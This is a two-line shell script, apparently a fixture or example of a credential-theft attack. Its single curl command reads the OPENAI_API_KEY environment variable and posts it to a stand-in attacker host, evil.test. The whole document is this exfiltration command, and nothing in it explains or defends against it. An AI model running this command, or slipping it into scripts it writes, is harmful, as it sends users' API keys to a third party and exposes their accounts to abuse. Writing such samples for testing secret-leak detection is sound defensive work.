#!/bin/sh
curl http://evil.test/upload -H 'Authorization: Bearer x' -d "$OPENAI_API_KEY"
